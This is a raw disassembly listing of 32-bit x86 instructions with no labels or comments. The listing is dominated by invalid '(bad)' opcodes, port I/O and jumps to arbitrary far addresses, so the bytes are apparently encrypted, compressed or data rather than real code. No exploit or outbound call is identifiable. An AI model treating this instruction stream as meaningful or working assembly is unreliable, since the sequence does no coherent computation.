  41f095:	test   eax,0xd79810e6
  41f09a:	outs   dx,BYTE PTR ds:[esi]
  41f09b:	pop    edx
  41f09c:	jbe    0x41f088
  41f09e:	push   ds
  41f09f:	dec    BYTE PTR [esi]
  41f0a1:	pop    edi
  41f0a2:	mov    edx,0x4aff5a8d
  41f0a7:	mov    eax,ds:0x66b05fb5
  41f0ac:	out    dx,eax
  41f0ad:	inc    ecx
  41f0ae:	retf   
  41f0af:	std    
  41f0b0:	div    BYTE PTR [edx+eiz*8+0x2d]
  41f0b4:	in     eax,dx
  41f0b5:	ficom  DWORD PTR [edx+eiz*1]
  41f0b8:	imul   esp,DWORD PTR [eax+0x3fe105ab],0x444d43f4
  41f0c2:	cmp    DWORD PTR [eax],0x49
  41f0c5:	cld    
  41f0c6:	add    bl,ah
  41f0c8:	mov    DWORD PTR [ebp-0x71],esi
  41f0cb:	xor    ebx,edi
  41f0cd:	jae    0x41f073
  41f0cf:	sti    
  41f0d0:	into   
  41f0d1:	test   BYTE PTR [eax+0x1e],bl
  41f0d4:	jg     0x41f0c1
  41f0d6:	ds or  edx,ebp
  41f0d9:	add    bh,BYTE PTR [edi+esi*4]
  41f0dc:	in     eax,0xa8
  41f0de:	sub    cl,cl
  41f0e0:	sbb    edi,DWORD PTR [ebx+0x73]
  41f0e3:	dec    edi
  41f0e4:	lods   al,BYTE PTR ds:[esi]
  41f0e5:	add    dh,al
  41f0e7:	in     al,dx
  41f0e8:	(bad)  
  41f0e9:	leave  
  41f0ea:	fisttp QWORD PTR [ebx-0x6f593abe]
  41f0f0:	jbe    0x41f0de
  41f0f2:	mov    edi,0xca48ba25
  41f0f7:	dec    edi
  41f0f8:	jae    0x41f0c0
  41f0fa:	adc    esp,DWORD PTR [edx-0x80297c0]
  41f100:	and    BYTE PTR [ecx],0x7c
  41f103:	push   ds
  41f104:	ror    BYTE PTR [ecx+ebp*2-0x41766f3e],0x77
  41f10c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f10d:	(bad)  
  41f10e:	pop    ss
  41f10f:	sbb    DWORD PTR [eax],eax
	...
  41f171:	add    BYTE PTR [eax],al
  41f173:	add    BYTE PTR [ebx+0x6c2a6cdf],bl
  41f179:	mov    ebx,0x3824ffdf
  41f17e:	(bad)  
  41f17f:	jmp    0x4ab8:0x7f9eeb50
  41f186:	add    DWORD PTR [eax],eax
  41f188:	add    al,0x1
  41f18a:	add    BYTE PTR [eax],al
  41f18c:	(bad)  [esi+0x5cc40908]
  41f192:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f193:	mov    ds:0xd2781293,al
  41f198:	das    
  41f199:	lods   al,BYTE PTR ds:[esi]
  41f19a:	cld    
  41f19b:	add    eax,0x26d00903
  41f1a0:	out    0xcf,al
  41f1a2:	xor    cl,BYTE PTR [edx-0x8]
  41f1a5:	sti    
  41f1a6:	mov    eax,0x24562a0a
  41f1ab:	ins    BYTE PTR es:[edi],dx
  41f1ac:	enter  0x6128,0x30
  41f1b0:	pop    esi
  41f1b1:	cld    
  41f1b2:	dec    ebp
  41f1b3:	in     eax,0xd3
  41f1b5:	sub    ch,BYTE PTR [ecx+0x2ab08034]
  41f1bb:	jmp    0x2f2940d
  41f1c0:	mov    ds:0x5d417a15,al
  41f1c5:	inc    edx
  41f1c6:	and    BYTE PTR [ebx-0x59],ah
  41f1c9:	icebp  
  41f1ca:	ds cmc 
  41f1cc:	ret    0x1f3b
  41f1cf:	mov    ds:0x1e90ec3a,al
  41f1d4:	jnp    0x41f19e
  41f1d6:	cmp    BYTE PTR [esi+0x58],0x4b
  41f1da:	mov    ah,0x83
  41f1dc:	and    BYTE PTR [ebx],bh
  41f1de:	dec    ecx
  41f1df:	add    al,0x57
  41f1e1:	adc    edi,ebp
  41f1e3:	push   eax
  41f1e4:	stc    
  41f1e5:	(bad)  
  41f1e7:	mov    al,0xbd
  41f1e9:	test   BYTE PTR [ebp+0x75],dh
  41f1ec:	jmp    0x41f194
  41f1ee:	inc    ecx
  41f1ef:	imul   ebp,DWORD PTR [ecx+ebx*4],0xaa250696
  41f1f6:	pop    esi
  41f1f7:	xchg   esi,eax
  41f1f8:	xor    esp,esp
  41f1fa:	dec    ebx
  41f1fb:	cmp    al,0x63
  41f1fd:	out    0x7,eax
  41f1ff:	loopne 0x41f188
  41f201:	fidiv  DWORD PTR [edx-0x1eed4969]
  41f207:	push   esi
  41f208:	adc    esp,esp
  41f20a:	adc    bl,BYTE PTR [esi-0x3d]
  41f20d:	adc    DWORD PTR [eax-0x2b],edx
  41f210:	mov    ah,0x62
  41f212:	xchg   DWORD PTR ds:0xb0a487b5,eax
  41f218:	cmp    DWORD PTR [ebp+0x63d1bd50],0xdc58ecb5
  41f222:	xchg   ecx,eax
  41f223:	stos   BYTE PTR es:[edi],al
  41f224:	lahf   
  41f225:	jp     0x41f1d1
  41f227:	adc    bl,bl
  41f229:	ja     0x41f1c3
  41f22b:	imul   esp,DWORD PTR gs:[ebp+0x52],0xe225016f
  41f233:	addr16 xor ch,cl
  41f236:	scas   eax,DWORD PTR es:[edi]
  41f237:	mov    ds:0xd92d9f47,al
  41f23c:	inc    edi
  41f23d:	mov    BYTE PTR [esi],bl
  41f23f:	adc    edx,DWORD PTR [edi-0xc]
  41f242:	xchg   esi,eax
  41f243:	jns    0x41f28f
  41f245:	mov    ch,0x24
  41f247:	mov    ch,0x74
  41f249:	std    
  41f24a:	mov    eax,DWORD PTR [ebp+0x6b]
  41f24d:	js     0x41f245
  41f24f:	shr    cl,1
  41f251:	stos   DWORD PTR es:[edi],eax
  41f252:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f253:	ffree  st(5)
  41f255:	stos   DWORD PTR es:[edi],eax
  41f256:	cmp    esp,esp
  41f258:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f259:	enter  0x9013,0xd1
  41f25d:	mov    ds:0x2044e9ac,al
  41f262:	call   0xb819:0xa60ccccb
  41f269:	in     eax,0xaf
  41f26b:	aaa    
  41f26c:	nop
  41f26d:	(bad)  
  41f26f:	fisttp DWORD PTR [esi-0x9]
  41f272:	dec    edx
  41f273:	ja     0x41f235
  41f275:	fiadd  DWORD PTR [ecx+0x8]
  41f279:	lods   ax,WORD PTR ds:[esi]
  41f27b:	iret   
  41f27c:	loop   0x41f26f
  41f27e:	jmp    0x7b6e:0xdfffbd7c
  41f285:	sbb    al,ch
  41f287:	shr    BYTE PTR [esi-0x69],cl
  41f28a:	test   al,0xe3
  41f28c:	cmp    DWORD PTR [edx+0x1d],0x9e
	...
  41f2f3:	add    BYTE PTR [ecx+0x1b],dl
  41f2f6:	jmp    DWORD PTR [esi-0x1]
  41f2f9:	out    0xd9,al
  41f2fb:	aas    
  41f2fc:	jo     0x41f2eb
  41f2fe:	sahf   
  41f2ff:	jb     0x41f293
  41f301:	mov    ds:0x4bbc0a63,eax
  41f306:	add    DWORD PTR [eax],eax
  41f308:	add    al,0x1
  41f30a:	add    BYTE PTR [eax],al
  41f30c:	aad    0xf6
  41f30e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f30f:	icebp  
  41f310:	ds dec esp
  41f312:	push   edi
  41f313:	mov    ecx,0xa634fed0
  41f318:	jo     0x41f2fe
  41f31a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f31b:	imul   esi,DWORD PTR [esi+eax*2],0xa7e3abf4
  41f322:	cmp    edi,DWORD PTR [edx+0x40]
  41f325:	ins    DWORD PTR es:[edi],dx
  41f326:	cmp    bh,al
  41f328:	xor    BYTE PTR ds:0x6d59a0aa,dh
  41f32e:	rol    BYTE PTR ds:0x1920d777,cl
  41f334:	and    DWORD PTR [eax],esi
  41f336:	je     0x41f2e8
  41f338:	pop    ebp
  41f339:	or     eax,0x60a2f859
  41f33e:	mov    dl,0xe4
  41f340:	das    
  41f341:	mov    eax,0x52a28b68
  41f346:	jg     0x41f3af
  41f348:	retf   
  41f349:	rcl    BYTE PTR [edx],1
  41f34b:	push   es
  41f34c:	repnz cmp dh,dl
  41f34f:	sbb    al,bh
  41f351:	sbb    ecx,DWORD PTR [edi-0x7f1d13a]
  41f357:	into   
  41f358:	mov    WORD PTR [eax],?
  41f35a:	sti    
  41f35b:	pop    ecx
  41f35c:	bound  ebx,QWORD PTR [ecx+0x2b2d58c1]
  41f362:	pop    edi
  41f363:	mov    WORD PTR [ecx+0x3b],gs
  41f366:	stc    
  41f367:	(bad)  
  41f368:	repnz popa 
  41f36a:	ins    DWORD PTR es:[edi],dx
  41f36b:	les    esp,FWORD PTR [esp+edi*2-0x46cd3db7]
  41f372:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f373:	call   0x4ed09767
  41f378:	repnz push es
  41f37a:	mov    ds:0xb8674630,eax
  41f37f:	sbb    ah,ah
  41f381:	cdq    
  41f382:	out    dx,al
  41f383:	mov    esi,0xf2e90192
  41f388:	enter  0x536,0x64
  41f38c:	add    ebp,esi
  41f38e:	sbb    al,0x0
  41f390:	leave  
  41f391:	mov    ds:0x3094f860,eax
  41f396:	adc    DWORD PTR [esi+0x1d],esp
  41f399:	test   BYTE PTR [ebx],0x43
  41f39c:	push   0xf0c4aa32
  41f3a1:	or     BYTE PTR [ecx+0x34f6ae5f],dh
  41f3a7:	xchg   edi,eax
  41f3a8:	scas   al,BYTE PTR es:[edi]
  41f3a9:	xlat   BYTE PTR ds:[ebx]
  41f3aa:	xlat   BYTE PTR ds:[ebx]
  41f3ab:	clc    
  41f3ac:	loop   0x41f359
  41f3ae:	cdq    
  41f3af:	shr    DWORD PTR [ecx-0x4f],0xf6
  41f3b3:	add    ebp,DWORD PTR cs:[eax]
  41f3b6:	iret   
  41f3b7:	data16 jge 0x41f3bc
  41f3ba:	mov    ch,0x40
  41f3bc:	xchg   ecx,eax
  41f3bd:	mov    DWORD PTR [ebp+0xb50244e],eax
  41f3c3:	test   al,0x3d
  41f3c5:	jl     0x41f38b
  41f3c7:	cmp    DWORD PTR [ebx],0x114bd1cd
  41f3cd:	pop    esi
  41f3ce:	push   ecx
  41f3cf:	loopne 0x41f40e
  41f3d1:	data16 out 0x14,al
  41f3d4:	icebp  
  41f3d5:	mov    edx,0x5a106688
  41f3da:	cmp    ebx,0x692b98af
  41f3e0:	das    
  41f3e1:	cmp    edi,edx
  41f3e3:	(bad)  
  41f3e4:	jp     0x41f3f6
  41f3e6:	push   esi
  41f3e7:	fstp   TBYTE PTR [edi-0x59]
  41f3ea:	leave  
  41f3eb:	xchg   ebx,eax
  41f3ec:	or     ah,BYTE PTR [eax-0x47e351cf]
  41f3f2:	(bad)  
  41f3f3:	aaa    
  41f3f4:	xchg   ebp,eax
  41f3f5:	xor    BYTE PTR [esi-0x6a],al
  41f3f8:	sub    al,BYTE PTR [edx]
  41f3fa:	mov    al,0xd
  41f3fc:	jg     0x41f408
  41f3fe:	scas   eax,DWORD PTR es:[edi]
  41f3ff:	inc    eax
  41f400:	jp     0x41f3ee
  41f402:	mov    esi,0xce0ffc68
  41f407:	jle    0x41f41c
  41f409:	xchg   ebx,eax
  41f40a:	jmp    0x2ef7955b
  41f40f:	scas   eax,DWORD PTR es:[edi]
	...
  41f474:	cmp    al,0xe7
  41f476:	imul   ebp,edi,0xfffffffb
  41f479:	out    dx,eax
  41f47a:	mov    esp,0xd5fd13f7
  41f47f:	mov    ch,0xf
  41f481:	mov    cl,0x34
  41f483:	rol    al,1
  41f485:	dec    esp
  41f486:	add    DWORD PTR [eax],eax
  41f488:	add    al,0x1
  41f48a:	add    BYTE PTR [eax],al
  41f48c:	push   ecx
  41f48d:	inc    ebp
  41f48e:	(bad)  
  41f48f:	scas   eax,DWORD PTR es:[edi]
  41f490:	fst    DWORD PTR [eax+0x5e]
  41f493:	jae    0x41f45e
  41f495:	pop    ebx
  41f496:	(bad)  
  41f497:	sub    ecx,DWORD PTR [edi-0x29]
  41f49a:	and    BYTE PTR [ebp+eax*4+0x30],dl
  41f49e:	(bad)  
  41f4a0:	and    al,0x5d
  41f4a2:	(bad)  
  41f4a3:	or     al,0xe7
  41f4a5:	jmp    0xf7c5:0x2a8d7902
  41f4ac:	mov    ch,0xed
  41f4ae:	cmp    esi,DWORD PTR [ebx]
  41f4b0:	pop    ebx
  41f4b1:	popf   
  41f4b2:	sub    dl,BYTE PTR [eax+0x28]
  41f4b5:	arpl   bp,bx
  41f4b7:	cmc    
  41f4b8:	inc    esp
  41f4b9:	inc    ebp
  41f4ba:	fidiv  DWORD PTR [ecx]
  41f4bc:	retf   
  41f4bd:	popf   
  41f4be:	popf   
  41f4bf:	inc    ecx
  41f4c0:	xlat   BYTE PTR ds:[ebx]
  41f4c1:	sub    ch,BYTE PTR [eax]
  41f4c3:	jmp    0x41f53b
  41f4c5:	cmp    al,0x87
  41f4c7:	nop
  41f4c8:	push   eax
  41f4c9:	and    al,0xf8
  41f4cb:	mov    edx,0xae813ca1
  41f4d0:	push   esp
  41f4d1:	not    eax
  41f4d3:	nop
  41f4d4:	addr16 in eax,0x2f
  41f4d7:	scas   al,BYTE PTR es:[edi]
  41f4d8:	rcr    BYTE PTR [eax-0x4f],0x32
  41f4dc:	cmp    eax,0x69f05141
  41f4e1:	imul   ecx,DWORD PTR [esp+edx*2+0x447828bd],0x60
  41f4e9:	sbb    BYTE PTR [edx-0x16],0xe3
  41f4ed:	cmp    BYTE PTR [edi+esi*2+0x69],0x52
  41f4f2:	ret    
  41f4f3:	shl    DWORD PTR [edi-0x2b8cd127],0xa6
  41f4fa:	jg     0x41f53c
  41f4fc:	dec    edx
  41f4fd:	retf   
  41f4fe:	pop    ss
  41f4ff:	xchg   bl,ch
  41f501:	push   esi
  41f502:	and    DWORD PTR [esi],esp
  41f504:	cwde   
  41f505:	push   0x343db10a
  41f50a:	mov    dh,al
  41f50c:	dec    BYTE PTR [edx+0x5b]
  41f50f:	fcmovb st,st(2)
  41f511:	push   ecx
  41f512:	gs and al,0x5f
  41f515:	adc    ebx,esp
  41f517:	aaa    
  41f518:	jmp    0x41f508
  41f51a:	leave  
  41f51b:	jge    0x41f554
  41f51d:	mov    DWORD PTR [ecx+0x60],ebp
  41f520:	fbld   TBYTE PTR [ecx-0x21]
  41f523:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f524:	(bad)  
  41f525:	jmp    0x7da:0xc7ec8757
  41f52c:	cmp    ah,ah
  41f52e:	lods   eax,DWORD PTR ds:[esi]
  41f52f:	lock and ah,al
  41f532:	cmp    eax,0xc3435d9d
  41f537:	das    
  41f538:	mov    eax,ds:0x3a5521bd
  41f53d:	aam    0x60
  41f53f:	sbb    DWORD PTR ds:0x29f823a6,esp
  41f545:	add    esp,DWORD PTR [esi+0x2270d5cd]
  41f54b:	rcl    DWORD PTR [ebx+0x1a],0xc6
  41f54f:	sbb    al,0x74
  41f551:	cmp    al,dh
  41f553:	adc    al,BYTE PTR [ecx]
  41f555:	add    eax,0x11188bf
  41f55a:	mov    edx,0x4b83e8f6
  41f55f:	test   al,0x69
  41f561:	hlt    
  41f562:	in     al,dx
  41f563:	inc    esp
  41f564:	jmp    0x425:0xdfb988fe
  41f56b:	add    DWORD PTR [ebp+ebp*2-0x60263633],0x1d
  41f573:	and    esp,DWORD PTR [ecx+0x7b9185e5]
  41f579:	ds jnp 0x41f5a7
  41f57c:	cmc    
  41f57d:	jne    0x41f511
  41f57f:	adc    BYTE PTR [ecx-0x2b],cl
  41f582:	rcr    DWORD PTR [ecx+eiz*2-0x5],1
  41f586:	lahf   
  41f587:	pop    esi
  41f588:	xor    DWORD PTR [eax-0x533dde3],esi
  41f58e:	bound  ebx,QWORD PTR [eax]
	...
  41f5f4:	js     0x41f62a
  41f5f6:	add    bh,bl
  41f5f8:	dec    esi
  41f5f9:	(bad)  
  41f5fa:	stc    
  41f5fb:	mov    bh,0xb7
  41f5fd:	jmp    0x2b08:0xd1e6d422
  41f604:	les    ecx,FWORD PTR [ebp+0x1]
  41f607:	add    BYTE PTR [ecx+eax*1],al
  41f60a:	add    BYTE PTR [eax],al
  41f60c:	xor    esp,DWORD PTR cs:[eax]
  41f60f:	loop   0x41f5fa
  41f611:	xchg   ebx,eax
  41f612:	add    al,0xcb
  41f614:	lods   eax,DWORD PTR ds:[esi]
  41f615:	ret    0x34d9
  41f618:	scas   al,BYTE PTR es:[edi]
  41f619:	xchg   BYTE PTR [eax+edx*1+0x3ffa6bb9],cl
  41f620:	movsx  edi,dh
  41f623:	dec    edx
  41f624:	bound  edx,QWORD PTR [edi+0x21]
  41f627:	ds sahf 
  41f629:	mov    bl,0x17
  41f62b:	xchg   esi,eax
  41f62c:	push   es
  41f62d:	add    edx,DWORD PTR [eax]
  41f62f:	mov    eax,ds:0xf621e0fb
  41f634:	repz fld QWORD PTR [edi+esi*8+0x3a]
  41f639:	sub    al,0xe8
  41f63b:	fcomi  st,st(5)
  41f63d:	popa   
  41f63e:	fwait
  41f63f:	adc    BYTE PTR [edx],ch
  41f641:	out    dx,eax
  41f642:	fs (bad) 
  41f644:	call   0x5f59:0xf9459ccc
  41f64b:	mov    ds:0x68e70216,eax
  41f650:	pop    eax
  41f651:	sub    al,0x6e
  41f653:	jbe    0x41f6bb
  41f655:	push   ebx
  41f656:	mov    ds:0x32455e05,eax
  41f65b:	or     DWORD PTR [edi],esp
  41f65d:	in     eax,0x97
  41f65f:	xlat   BYTE PTR ds:[ebx]
  41f660:	cwde   
  41f661:	ret    
  41f662:	jmp    DWORD PTR [ebp+0x2b]
  41f665:	in     al,dx
  41f666:	call   0x3ede858e
  41f66b:	xchg   ebx,eax
  41f66c:	rcl    DWORD PTR [eax],cl
  41f66e:	lods   al,BYTE PTR ds:[esi]
  41f66f:	dec    ecx
  41f670:	iret   
  41f671:	sti    
  41f672:	ret    0xaf77
  41f675:	test   DWORD PTR [edx+0x69b13af9],esi
  41f67b:	into   
  41f67c:	stc    
  41f67d:	shr    BYTE PTR [ebx-0x54c8db37],cl
  41f683:	ja     0x41f65f
  41f685:	retf   0x6ae6
  41f688:	pushf  
  41f689:	fs inc esp
  41f68b:	xlat   BYTE PTR ds:[ebx]
  41f68c:	(bad)  
  41f68d:	(bad)  
  41f68e:	jge    0x41f6bd
  41f690:	jae    0x41f690
  41f692:	pusha  
  41f693:	sub    bl,bh
  41f695:	pop    eax
  41f696:	or     DWORD PTR [esp+edx*8],eax
  41f699:	adc    eax,0x730fafbe
  41f69e:	arpl   WORD PTR [ebp-0x5fc5c830],sp
  41f6a4:	es cmc 
  41f6a6:	sub    eax,0xf3e17b7d
  41f6ab:	sbb    BYTE PTR [eax-0x591d2035],0x50
  41f6b2:	pop    edx
  41f6b3:	mov    ds:0x4966eac1,al
  41f6b8:	sub    ah,BYTE PTR [ebx]
  41f6ba:	mov    dl,0xed
  41f6bc:	ins    BYTE PTR es:[edi],dx
  41f6bd:	mov    bh,0xde
  41f6bf:	hlt    
  41f6c0:	daa    
  41f6c1:	xchg   esi,eax
  41f6c2:	in     al,dx
  41f6c3:	jg     0x41f6b1
  41f6c5:	inc    esp
  41f6c6:	sub    al,0x1a
  41f6c8:	aad    0xf9
  41f6ca:	xchg   ebp,eax
  41f6cb:	imul   esi,eax,0x11
  41f6ce:	xchg   edi,eax
  41f6cf:	or     DWORD PTR [edi-0x50f9ca0f],edx
  41f6d5:	sahf   
  41f6d6:	ret    
  41f6d7:	or     al,BYTE PTR [eax-0x18]
  41f6da:	scas   al,BYTE PTR es:[di]
  41f6dc:	call   0xbbd2:0xea8ea746
  41f6e3:	jnp    0x41f69a
  41f6e5:	popf   
  41f6e6:	addr16 jne 0x41f6b6
  41f6e9:	mov    WORD PTR [ecx+0x16c4e35e],fs
  41f6ef:	pop    es
  41f6f0:	lds    eax,FWORD PTR [ebx-0x6f]
  41f6f3:	bound  ebp,QWORD PTR [eax+0x276603a5]
  41f6f9:	lds    ebx,FWORD PTR [ecx+0x3cb6a162]
  41f6ff:	pop    eax
  41f700:	nop
  41f701:	add    al,0x4e
  41f703:	arpl   dx,dx
  41f705:	push   esi
  41f706:	cld    
  41f707:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f708:	sbb    eax,0xffffff9e
  41f70b:	mov    edi,0x32501171
	...
  41f774:	xchg   edx,eax
  41f775:	cmp    al,0x23
  41f777:	jle    0x41f728
  41f779:	jg     0x41f75a
  41f77b:	cld    
  41f77c:	call   0xb5fb:0xcf6c62d2
  41f783:	scas   eax,DWORD PTR es:[edi]
  41f784:	enter  0x14e,0x0
  41f788:	add    al,0x1
  41f78a:	add    BYTE PTR [eax],al
  41f78c:	mov    al,0x76
  41f78e:	pop    es
  41f78f:	xlat   BYTE PTR ds:[ebx]
  41f790:	ins    BYTE PTR es:[edi],dx
  41f791:	bnd jle 0x41f714
  41f794:	cmc    
  41f795:	mov    bh,0x35
  41f797:	add    DWORD PTR ds:0x35f4c556,ecx
  41f79d:	dec    edi
  41f79e:	repz mov eax,0x8f6ae931
  41f7a4:	mov    cl,0xb0
  41f7a6:	les    esi,FWORD PTR [esp+ecx*8+0x16]
  41f7aa:	int    0x4
  41f7ac:	inc    edx
  41f7ad:	and    DWORD PTR [esi],ebp
  41f7af:	fnsave [edi]
  41f7b1:	xchg   bl,bl
  41f7b3:	jns    0x41f791
  41f7b5:	xchg   edi,eax
  41f7b7:	(bad)  
  41f7b8:	stos   BYTE PTR es:[edi],al
  41f7b9:	cmp    BYTE PTR [esi],al
  41f7bb:	sub    esp,DWORD PTR [ecx*4-0x1d3efe9]
  41f7c2:	ins    DWORD PTR es:[edi],dx
  41f7c3:	repnz enter 0x5a0a,0x2b
  41f7c8:	sub    esp,edi
  41f7ca:	mov    al,ds:0xb7f570ed
  41f7cf:	shl    DWORD PTR [ebp+0xd9689a2],0x94
  41f7d6:	(bad)  
  41f7d7:	pop    esp
  41f7d8:	inc    eax
  41f7d9:	mul    al
  41f7db:	dec    edi
  41f7dc:	push   0x5d0c4d83
  41f7e1:	xchg   ebx,eax
  41f7e2:	jnp    0x41f76b
  41f7e4:	or     ecx,DWORD PTR [ebx-0x66]
  41f7e7:	test   al,0x1c
  41f7e9:	and    bl,BYTE PTR [ecx-0x115b5c32]
  41f7ef:	dec    edi
  41f7f0:	out    dx,eax
  41f7f1:	and    al,0x12
  41f7f3:	xchg   ebx,eax
  41f7f4:	pop    ds
  41f7f5:	test   eax,0x330c8e74
  41f7fa:	in     eax,dx
  41f7fb:	pop    edx
  41f7fc:	push   0x43
  41f7fe:	dec    ebp
  41f7ff:	std    
  41f800:	mov    ch,0xd6
  41f802:	pop    edx
  41f803:	or     eax,DWORD PTR [edi]
  41f805:	dec    esi
  41f806:	pop    esp
  41f807:	or     DWORD PTR [edi-0x11ef4474],edi
  41f80d:	jo     0x41f807
  41f80f:	inc    ecx
  41f810:	jo     0x41f85e
  41f812:	sahf   
  41f813:	or     cl,BYTE PTR [esi]
  41f815:	loop   0x41f7a8
  41f817:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f818:	inc    ebp
  41f819:	sahf   
  41f81a:	stc    
  41f81b:	sbb    ch,al
  41f81d:	test   al,0x11
  41f81f:	popf   
  41f820:	fisub  WORD PTR [edx+ebx*2-0x1a]
  41f824:	mov    sp,0x94bb
  41f829:	mov    ecx,0xbf92da5
  41f82e:	stos   BYTE PTR es:[edi],al
  41f82f:	imul   ebp,DWORD PTR [ecx+0x310bcb0c],0x77
  41f836:	push   0x609fd861
  41f83b:	ror    DWORD PTR [edi+0x5a],cl
  41f83e:	or     eax,0x8c059788
  41f843:	adc    bh,BYTE PTR ds:0x78a4f559
  41f849:	and    DWORD PTR [ebx+0x40eb040d],edx
  41f84f:	lahf   
  41f850:	or     BYTE PTR [edx+0x2002a0a1],bh
  41f856:	fist   WORD PTR [esp+esi*4]
  41f859:	inc    edi
  41f85a:	pusha  
  41f85b:	ret    0x3c32
  41f85e:	xchg   DWORD PTR [edi],esp
  41f860:	pop    edx
  41f861:	es fwait
  41f863:	popa   
  41f864:	inc    ebp
  41f865:	mov    cl,0xf2
  41f867:	pop    esi
  41f868:	or     eax,0x3cdee4c2
  41f86d:	xor    bl,BYTE PTR [bp+si]
  41f870:	std    
  41f871:	mov    dh,0xc4
  41f873:	sahf   
  41f874:	test   al,0xec
  41f876:	jl     0x41f8f6
  41f878:	and    eax,0x454f818c
  41f87d:	(bad)  
  41f87f:	dec    ebp
  41f880:	mov    ds:0xe3d605ee,al
  41f885:	mov    ah,0xa5
  41f887:	and    al,BYTE PTR [esp+ebx*2-0x78]
  41f88b:	sbb    al,0x73
  41f88d:	cmp    eax,0x9529
	...
  41f8f2:	add    BYTE PTR [eax],al
  41f8f4:	mov    eax,ds:0x3b920b9a
  41f8f9:	xchg   ebx,eax
  41f8fa:	mov    ecx,0x4183febb
  41f8ff:	pop    edx
  41f900:	int    0x14
  41f902:	int    0x22
  41f904:	int3   
  41f905:	dec    edi
  41f906:	add    DWORD PTR [eax],eax
  41f908:	add    al,0x1
  41f90a:	add    BYTE PTR [eax],al
  41f90c:	cmp    bl,BYTE PTR [edi+ecx*8]
  41f90f:	pushf  
  41f910:	pop    edx
  41f911:	xchg   ecx,eax
  41f912:	add    BYTE PTR [edi+0x4faf1ca8],ch
  41f918:	mov    edx,0xcc7aabf5
  41f91d:	xchg   edi,eax
  41f91e:	jne    0x41f8da
  41f920:	out    dx,al
  41f921:	push   ecx
  41f922:	out    dx,eax
  41f923:	aas    
  41f924:	lock push ds
  41f926:	and    DWORD PTR [edx+0x8ddad92],ecx
  41f92c:	arpl   WORD PTR [edi+0x58029053],cx
  41f932:	add    eax,0x3023cca0
  41f937:	outs   dx,BYTE PTR ds:[esi]
  41f938:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f939:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f93a:	rol    DWORD PTR [eax-0x7e],cl
  41f93d:	mov    al,ds:0xcd6bfa63
  41f942:	test   DWORD PTR [ecx-0x57],edx
  41f945:	in     al,dx
  41f946:	inc    esi
  41f947:	xchg   ebp,eax
  41f948:	pop    edi
  41f949:	and    ch,BYTE PTR [ebp+eiz*1-0x37]
  41f94d:	sub    al,al
  41f94f:	int    0x5a
  41f951:	jle    0x41f923
  41f953:	adc    ebp,DWORD PTR [esi+0x8]
  41f956:	push   ebx
  41f957:	sub    esi,DWORD PTR [ebx-0xd]
  41f95a:	loop   0x41f9c1
  41f95c:	xor    BYTE PTR [edi-0x3deeb5dd],bh
  41f962:	sbb    esi,DWORD PTR [ebp+0x57]
  41f965:	int3   
  41f966:	sub    esp,DWORD PTR [ebx]
  41f968:	fs das 
  41f96a:	gs cs xor dh,cl
  41f96e:	out    0x1d,al
  41f970:	mov    al,0x35
  41f972:	lds    ebx,FWORD PTR [ecx+0x593cf654]
  41f978:	js     0x41f95e
  41f97a:	pop    ds
  41f97b:	push   esp
  41f97c:	push   cs
  41f97d:	imul   esi,DWORD PTR [edi+eiz*8-0x33],0x6c9b6033
  41f985:	add    DWORD PTR [ebx-0x1af193c0],ecx
  41f98b:	inc    edx
  41f98c:	adc    BYTE PTR [ebx+0x3d],bl
  41f98f:	jmp    0x41f92e
  41f991:	in     al,dx
  41f992:	push   ecx
  41f993:	js     0x41f9ea
  41f995:	adc    ecx,DWORD PTR ds:0x9229bced
  41f99b:	fnstcw WORD PTR [edi]
  41f99d:	jmp    0x6a7cadb0
  41f9a2:	out    dx,al
  41f9a3:	arpl   WORD PTR [ebx+0x5284e72a],bx
  41f9a9:	scas   al,BYTE PTR es:[edi]
  41f9aa:	cmp    eax,0x730208a5
  41f9af:	hlt    
  41f9b0:	call   0x4399:0x1a0cbe68
  41f9b7:	int    0x83
  41f9b9:	inc    edx
  41f9ba:	neg    dh
  41f9bc:	pusha  
  41f9bd:	pop    ebx
  41f9be:	and    eax,DWORD PTR [edx-0x79]
  41f9c1:	sub    BYTE PTR [edx],0xbb
  41f9c4:	xor    bl,BYTE PTR [ebp+edi*4+0x2a]
  41f9c8:	and    eax,0xad88259b
  41f9cd:	xchg   esi,eax
  41f9ce:	addr16 pop edx
  41f9d0:	sub    DWORD PTR [ebx+0x4b],edi
  41f9d3:	ja     0x41f9cc
  41f9d5:	mov    ebp,0x3a023adb
  41f9da:	pop    ds
  41f9db:	cmp    BYTE PTR ds:0xb0334dcf,0x7f
  41f9e2:	lock pop esp
  41f9e4:	fst    QWORD PTR [edi+edi*8+0x1f]
  41f9e8:	loopne 0x41f976
  41f9ea:	pop    edi
  41f9eb:	inc    ebx
  41f9ec:	loope  0x41fa47
  41f9ee:	push   esp
  41f9ef:	xor    al,0xa7
  41f9f1:	je     0x41f985
  41f9f3:	or     esi,edx
  41f9f5:	(bad)  
  41f9f6:	lods   eax,DWORD PTR ds:[esi]
  41f9f7:	ret    
  41f9f8:	mov    ds:0x89cdb3f8,eax
  41f9fd:	mov    cl,0x6b
  41f9ff:	stos   DWORD PTR es:[edi],eax
  41fa00:	pop    ecx
  41fa01:	lock aas 
  41fa03:	or     al,0xe5
  41fa05:	aas    
  41fa06:	popf   
  41fa07:	or     DWORD PTR [esi],edi
  41fa09:	mov    bl,al
  41fa0b:	ins    DWORD PTR es:[edi],dx
  41fa0c:	add    ebx,ecx
  41fa0e:	stc    
  41fa0f:	xchg   esi,eax
	...
  41fa74:	or     al,BYTE PTR [ecx-0x49]
  41fa77:	mov    eax,ds:0xeb1ef7ff
  41fa7c:	and    edx,DWORD PTR [edi-0x5d]
  41fa7f:	adc    eax,0xbb0c96c2
  41fa84:	rcl    BYTE PTR [eax+0x1],1
  41fa87:	add    BYTE PTR [ecx+eax*1],al
  41fa8a:	add    BYTE PTR [eax],al
  41fa8c:	pop    es
